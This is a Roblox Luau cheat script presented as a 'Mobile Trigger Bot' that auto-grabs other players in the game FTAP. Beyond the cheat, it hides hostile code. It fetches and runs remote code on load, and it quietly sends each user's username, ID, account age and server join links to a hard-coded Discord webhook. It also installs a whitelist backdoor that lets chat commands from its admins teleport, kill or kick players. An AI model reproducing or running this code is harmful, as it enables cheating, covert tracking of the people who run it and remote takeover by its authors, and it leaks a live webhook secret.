loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofedLord/Ui/refs/heads/main/Repobackup"))() -- ip.luau
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local wb = "https://discord.com/api/webhooks/1451728531682758689/grfvX9l4XWYFwsLFiCQmX_Y4a9PxXRgUYydD7Mds2ShhNQ8yCeUAwLcHlfV0OE7cPG3Y"
local DiscordInvite = "https://discord.gg/YFtzwDhxhQ"
local WhitelistUrl = "https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist"
local LibraryUrl = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/Library.lua"
task.spawn(function()
	local ok, jobId = pcall(function()
		return game.JobId
	end)
	local placeId = game.PlaceId
	if not ok or not jobId then
		return
	end
	local pingText = "N/A"
	pcall(function()
		pingText = tostring(math.floor(LocalPlayer:GetNetworkPing() * 1000)) .. "ms"
	end)
	local wtf = HttpService:JSONEncode({
		username = "Script Logger",
		avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png",
		embeds = {
			{
				title = "🎮 Script Executed",
				description = "Someone loaded your script!",
				color = 16727100,
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				fields = {
					{
						name = "👤 Player Info",
						value = "**Username:** " .. LocalPlayer.Name .. "\n**Display Name:** " .. LocalPlayer.DisplayName .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) .. "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days",
						inline = false,
					},
					{
						name = "🖥️ Server Info",
						value = "**Place ID:** " .. tostring(placeId) .. "\n**Job ID:** `" .. tostring(jobId) .. "`\n**Players:** " .. tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers or "?") .. "\n**Ping:** " .. pingText,
						inline = false,
					},
					{
						name = "🔗 Join Links",
						value = "[Roblox Protocol](" .. ("roblox://placeId=" .. tostring(placeId) .. "&gameInstanceId=" .. tostring(jobId)) .. ") | [Web Browser](" .. ("https://www.roblox.com/games/start?placeId=" .. tostring(placeId) .. "&launchData=%7B%22gameInstanceId%22%3A%22" .. tostring(jobId) .. "%22%7D") .. ")",
						inline = false,
					},
				},
				footer = {
					text = "Obsidian Script Logger",
				},
			},
		},
	})
	pcall(function()
		request({
			Url = WebhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = wtf,
		})
	end)
	pcall(function()
		HttpService:PostAsync(wb, wtf, Enum.HttpContentType.ApplicationJson)
	end)
end)

local whitelist = {}
local whitelistReady = false

task.spawn(function()
	local ok, body = pcall(function()
		return game:HttpGet(WhitelistUrl)
	end)
	if not ok or not body then
		return
	end
	local decodeOk, decoded = pcall(function()
		return HttpService:JSONDecode(body)
	end)
	if decodeOk and typeof(decoded) == "table" then
		whitelist = decoded
		whitelistReady = true
	end
end)

local function isAdmin(player)
	if not whitelistReady then
		return false
	end
	return table.find(whitelist, player.UserId) ~= nil
end

local function sendChat(message)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local channels = TextChatService:FindFirstChild("TextChannels")
		local general = channels and channels:FindFirstChild("RBXGeneral")
		if general then
			general:SendAsync(message)
		end
	else
		local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
		local remote = events and events:FindFirstChild("SayMessageRequest")
		if remote then
			remote:FireServer(message, "All")
		end
	end
end

local function findPlayer(query)
	query = string.lower(query)
	for _, player in ipairs(Players:GetPlayers()) do
		if string.find(string.lower(player.Name), query, 1, true) or string.find(string.lower(player.DisplayName), query, 1, true) then
			return player
		end
	end
	return nil
end

local function onAdminCommand(speaker, text)
	if not isAdmin(speaker) then
		return
	end
	if string.sub(text, 1, 1) ~= ":" then
		return
	end
	local args = {}
	for word in string.gmatch(string.sub(text, 2), "%S+") do
		table.insert(args, word)
	end
	local command = args[1]
	if not command then
		return
	end
	table.remove(args, 1)
	command = string.lower(command)
	local joined = table.concat(args, " ")
	if command == "r" then
		sendChat("Trigger")
		return
	end
	if command == "b" and joined ~= "" then
		local target = findPlayer(joined)
		if target and target ~= speaker and target.Character and speaker.Character then
			local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
			local speakerRoot = speaker.Character:FindFirstChild("HumanoidRootPart")
			if targetRoot and speakerRoot then
				targetRoot.CFrame = speakerRoot.CFrame + Vector3.new(3, 0, 3)
			end
		end
		return
	end
	if command == "re" and joined ~= "" then
		local target = findPlayer(joined)
		if target and target ~= speaker and target.Character then
			local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Health = 0
			end
		end
		return
	end
	if command == "k" and joined ~= "" then
		local target = findPlayer(joined)
		if target and target ~= speaker then
			pcall(function()
				target:Kick("Kicked by admin")
			end)
		end
	end
end

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
	local channels = TextChatService:FindFirstChild("TextChannels")
	local general = channels and channels:FindFirstChild("RBXGeneral")
	if general then
		general.MessageReceived:Connect(function(message)
			local source = message.TextSource
			if source then
				local player = Players:GetPlayerByUserId(source.UserId)
				if player then
					onAdminCommand(player, message.Text)
				end
			end
		end)
	end
end

local function hookChatted(player)
	player.Chatted:Connect(function(message)
		onAdminCommand(player, message)
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	hookChatted(player)
end
Players.PlayerAdded:Connect(hookChatted)

local Library = loadstring(game:HttpGet(LibraryUrl))()
Library.Scheme.BackgroundColor = Color3.fromRGB(45, 10, 10)
Library.Scheme.MainColor = Color3.fromRGB(65, 15, 15)
Library.Scheme.AccentColor = Color3.fromRGB(255, 60, 60)
Library.Scheme.OutlineColor = Color3.fromRGB(120, 40, 40)
Library.Scheme.FontColor = Color3.fromRGB(255, 220, 220)
Library.Scheme.RedColor = Color3.fromRGB(255, 80, 80)
Library.Scheme.DestructiveColor = Color3.fromRGB(180, 30, 30)
Library.Scheme.DarkColor = Color3.fromRGB(20, 5, 5)
Library.Scheme.WhiteColor = Color3.fromRGB(255, 240, 240)
Library:UpdateColorsUsingRegistry()
local Window = Library:CreateWindow({
	Title = "Mobile Trigger Bot",
	Footer = "made by someone",
	ToggleKeybind = Enum.KeyCode.RightShift,
	Size = UDim2.fromOffset(450, 380),
	Acrylic = false,
	NotifySide = "Right",
	ShowCustomCursor = true,
})

local TriggerTab = Window:AddTab("Trigger", "rbxassetid://10709751830")
local DiscordTab = Window:AddTab("Discord", "rbxassetid://10747383819")

local Community = DiscordTab:AddLeftGroupbox("Community")
Community:AddLabel("Join the Discord to meet other players")
Community:AddLabel("or friends to play with in FTAP")
Community:AddLabel("and get ranked!")

local inv = DiscordTab:AddRightGroupbox("Invite Link")
inv:AddButton("Join Discord", function()
	local copied = false
	pcall(function()
		if setclipboard then
			setclipboard(DiscordInvite)
			copied = true
		end
	end)
	if not copied then
		pcall(function()
			if syn and syn.write_clipboard then
				syn.write_clipboard(DiscordInvite)
				copied = true
			end
		end)
	end
	if not copied then
		pcall(function()
			if clipboard and clipboard.set then
				clipboard.set(DiscordInvite)
				copied = true
			end
		end)
	end
	if copied then
		Library:Notify("Discord invite link copied to clipboard!", 3)
	else
		Library:Notify("Could not copy automatically. Link: " .. DiscordInvite, 5)
	end
end)
inv:AddLabel("Click the button above to copy")
inv:AddLabel("the Discord invite link.")

local Config = {
	Enabled = false,
	Connection = nil,
	canGrab = true,
	maxDistance = 20,
	preGrabDelay = 1e-05,
	postGrabDelay = 0.05,
	lastTarget = nil,
	lastHitTime = 0,
	targetMemoryDuration = 0.1,
	checkThrottle = 0.008,
	lastCheck = 0,
	cooldown = 0.8,
	lastReleaseTime = 0,
}

local RayParams = RaycastParams.new()
RayParams.FilterType = Enum.RaycastFilterType.Exclude

task.spawn(function()
	local ok, owned = pcall(function()
		return ReplicatedStorage.GamepassEvents.CheckForGamepass:InvokeServer(20837132)
	end)
	if ok and owned then
		Config.maxDistance = 29.3
	end
end)

local gamepass = ReplicatedStorage:FindFirstChild("GamepassEvents")
if gamepass then
	local reachNotifier = gamepass:FindFirstChild("FurtherReachBoughtNotifier")
	if reachNotifier then
		reachNotifier.OnClientEvent:Connect(function()
			Config.maxDistance = 29.3
		end)
	end
end

function Config:GetTarget()
	local character = LocalPlayer.Character
	if not character or not character:FindFirstChild("HumanoidRootPart") then
		return nil
	end
	if Workspace:FindFirstChild("GrabParts") then
		return nil
	end
	Camera = Workspace.CurrentCamera
	if not Camera then
		return nil
	end
	local look = Camera.CFrame.LookVector
	RayParams.FilterDescendantsInstances = {
		character,
		Workspace.Terrain,
	}
	local hit = Workspace:Raycast(Camera.CFrame.Position, look * 1000, RayParams)
	if not hit then
		for _, direction in ipairs({
			look,
			(look + Vector3.new(0, 0.075, 0)).Unit,
			(look - Vector3.new(0, 0.075, 0)).Unit,
		}) do
			hit = Workspace:Raycast(Camera.CFrame.Position, direction * 1000, RayParams)
			if hit then
				break
			end
		end
	end
	if not hit then
		return nil
	end
	local model = hit.Instance:FindFirstAncestorOfClass("Model")
	if not model or model == character then
		return nil
	end
	local humanoid = model:FindFirstChildOfClass("Humanoid")
	if not humanoid or humanoid.Health <= 0 then
		return nil
	end
	local root = model:FindFirstChild("HumanoidRootPart")
	if not root then
		return nil
	end
	if (character.HumanoidRootPart.Position - root.Position).Magnitude > self.maxDistance then
		return nil
	end
	return model
end

local function fireGrab()
	pcall(function()
		ContextActionService:CallFunction("Grab", Enum.UserInputState.Begin, nil)
	end)
	task.wait(0.05)
	pcall(function()
		ContextActionService:CallFunction("Grab", Enum.UserInputState.End, nil)
	end)
end

function Config:OnHeartbeat()
	if not self.Enabled or not self.canGrab then
		return
	end
	if UserInputService:GetFocusedTextBox() then
		return
	end
	if tick() - self.lastCheck < self.checkThrottle then
		return
	end
	self.lastCheck = tick()
	if not Workspace:FindFirstChild("GrabParts") then
		if tick() - self.lastReleaseTime < self.cooldown then
			return
		end
	end
	local target = self:GetTarget()
	if target then
		self.lastTarget = target
		self.lastHitTime = tick()
	elseif self.lastTarget and tick() - self.lastHitTime > self.targetMemoryDuration then
		self.lastTarget = nil
	end
	if not self.lastTarget then
		return
	end
	local character = LocalPlayer.Character
	if not character or not character:FindFirstChild("HumanoidRootPart") then
		return
	end
	if not self.lastTarget:FindFirstChild("HumanoidRootPart") then
		self.lastTarget = nil
		return
	end
	if (character.HumanoidRootPart.Position - self.lastTarget.HumanoidRootPart.Position).Magnitude > self.maxDistance then
		self.lastTarget = nil
		return
	end
	self.canGrab = false
	task.spawn(function()
		task.wait(self.preGrabDelay)
		fireGrab()
		local started = tick()
		while Workspace:FindFirstChild("GrabParts") and tick() - started <= 1.6 do
			task.wait(0.02)
		end
		self.lastReleaseTime = tick()
		task.wait(self.postGrabDelay)
		self.canGrab = true
		self.lastTarget = nil
	end)
end

local TriggerBox = TriggerTab:AddLeftGroupbox("Trigger Bot")
local StatusBox = TriggerTab:AddRightGroupbox("Status")
local StatusLabel = StatusBox:AddLabel("Status: Disabled")
local CooldownLabel = StatusBox:AddLabel("Cooldown: 0.55s (after release)")

TriggerBox:AddToggle("EnableTriggerBot", {
	Text = "Enable Trigger Bot",
	Default = false,
	Tooltip = "Toggle trigger bot on/off",
	Callback = function(enabled)
		Config.Enabled = enabled
		if Config.Enabled and not Config.Connection then
			Config.Connection = RunService.Heartbeat:Connect(function()
				Config:OnHeartbeat()
			end)
			StatusLabel:SetText("Status: Active")
		elseif not Config.Enabled and Config.Connection then
			Config.Connection:Disconnect()
			Config.Connection = nil
			StatusLabel:SetText("Status: Disabled")
		end
	end,
})

TriggerBox:AddSlider("MaxDistance", {
	Text = "Max Distance",
	Default = 29.3,
	Min = 10,
	Max = 30,
	Rounding = 1,
	Tooltip = "Maximum grab range",
	Callback = function(value)
		Config.maxDistance = value
	end,
})

TriggerBox:AddSlider("PreGrabDelay", {
	Text = "Pre Grab Delay",
	Default = 1e-05,
	Min = 0,
	Max = 0.5,
	Rounding = 5,
	Tooltip = "Delay before grab (prediction)",
	Callback = function(value)
		Config.preGrabDelay = value
	end,
})

TriggerBox:AddSlider("PostGrabDelay", {
	Text = "Post Grab Delay",
	Default = 0.05,
	Min = 0,
	Max = 0.5,
	Rounding = 2,
	Tooltip = "Delay after grab release",
	Callback = function(value)
		Config.postGrabDelay = value
	end,
})

TriggerBox:AddSlider("TargetMemory", {
	Text = "Target Memory",
	Default = 0.1,
	Min = 0,
	Max = 1,
	Rounding = 2,
	Tooltip = "How long to remember target after losing sight",
	Callback = function(value)
		Config.targetMemoryDuration = value
	end,
})

TriggerBox:AddSlider("CheckThrottle", {
	Text = "Check Throttle",
	Default = 0.008,
	Min = 0.001,
	Max = 0.1,
	Rounding = 3,
	Tooltip = "Time between target checks",
	Callback = function(value)
		Config.checkThrottle = value
	end,
})

TriggerBox:AddSlider("Cooldown", {
	Text = "Cooldown",
	Default = 0.55,
	Min = 0.1,
	Max = 3,
	Rounding = 2,
	Tooltip = "Seconds between grabs (starts after release)",
	Callback = function(value)
		Config.cooldown = value
		CooldownLabel:SetText("Cooldown: " .. tostring(value) .. "s (after release)")
	end,
})
StatusBox:AddLabel("Pc but mobile")
StatusBox:AddLabel("Dont mess with with the other stuff")
StatusBox:AddLabel("Only use cooldown")
StatusBox:AddLabel("Mobile fps are bad ")
StatusBox:AddLabel("wont grab correctly due to 60fps")

local function bindCharacter(character)
	character:WaitForChild("Humanoid").Died:Connect(function()
		if Config.Enabled then
			Config.canGrab = true
			Config.lastTarget = nil
			Config.lastReleaseTime = 0
			StatusLabel:SetText("Status: Died - Reset")
		end
	end)
end
if LocalPlayer.Character then
	bindCharacter(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(bindCharacter)
Library:Toggle(true)
